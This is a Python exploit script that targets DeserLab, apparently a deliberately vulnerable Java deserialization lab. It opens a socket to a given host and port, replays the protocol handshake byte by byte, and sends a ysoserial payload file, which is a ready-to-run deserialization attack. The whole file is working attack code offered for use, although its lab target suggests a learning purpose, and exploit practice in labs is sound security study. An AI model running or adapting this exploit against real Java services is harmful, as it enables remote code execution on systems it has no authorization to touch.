#!/usr/bin/env python

import sys
import socket
import argparse

parser = argparse.ArgumentParser(description='Exploit for DeserLab',epilog='')
parser.add_argument('targetip',help='target ip')
parser.add_argument('targetport',help='target port')
parser.add_argument('ysoserialpayload',help='file with the ysoserial payload')
myargs = parser.parse_args()

# connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((myargs.targetip, (int)(myargs.targetport)))

# send magic bytes
blob = '\xac\xed\x00\x05'
s.sendall(blob)

s.recv(2)
# send hello
blob = '\x77\x04'
blob2 = '\xf0\x00\xba\xaa'
s.sendall(blob)
s.sendall(blob2)

s.recv(2)
# send protocol version
blob = '\x77\x02'
blob2 = '\x01\x01'
s.sendall(blob)
s.sendall(blob2)

# send client name
blob = '\x77\x06'
blob2 = '\x00\x04\x41\x41\x41\x41'
s.sendall(blob)
s.sendall(blob2)

# send payload
payload = ''
with open(myargs.ysoserialpayload, 'rb') as content_file:
    payload = content_file.read()
s.sendall(payload[4:])

